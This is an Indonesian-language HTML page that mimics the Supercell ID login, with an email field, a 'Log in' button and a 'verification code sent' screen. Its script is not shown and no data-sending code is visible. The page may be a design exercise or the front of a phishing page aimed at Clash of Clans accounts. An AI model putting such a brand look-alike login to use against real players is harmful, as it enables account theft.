<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supercell</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="icon2.png" type="png/image">
</head>
<body>
    
    <main>
        <div class="container">
            <div class="logoSupercell">
                <img src="supercell.png" alt="">
            </div>
            <div class="labelBar">
                <span>Masuk</span>
                <span>Verifikasi</span>
            </div>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar">
                  <div class="progress-indicator" id="progressIndicator"></div>
                </div>
            </div>
            <div class="isi-container1 show">
                <div class="bodyContainer">
                    <span>Masuk Ke Supercell ID</span>
                    <span>Masukkan email anda dan kami akan mengirimkan kode verifikasi.</span>
                </div>
                <form action="#">
                    <div class="inputSupercell">
                        <input type="text" id="emailInput" placeholder="Masukkan Email" required>
                        <span>Situs ini dilindungi oleh reCAPTCHA. <a href="">Kebijakan Privasi</a> dan <a href="">Ketentuan Layanan</a> Google juga berlaku.</span>
                    </div>
                    <div class="button">
                        <button onclick="startVerification()">Log in</button>
                        <a href="https://play.google.com/store/apps/details?id=com.supercell.clashofclans&pcampaignid=web_share" target="_blank" class="kembaliContainer">Kembali</a>
                    </div>
                </form>
                <div class="pendaftaranSupercell">
                    <a href="">Ingin mendaftar Supercell ID?</a>
                </div>
            </div>

            <div class="isi-container2">
                <div class="bodyContainer-2">
                    <span>Sedikit Lagi!</span>
                    <span>Kode verifikasi telah dikirimkan ke email</span>
                    <span id="emailTerkirim"></span>
                </div>
                
                <div class="button">
                    <button onclick="kembaliVerification()">Kembali</button>
                </div>
            </div>
        </div>
    </main>

    <script src="script.js"></script>
</body>
</html>
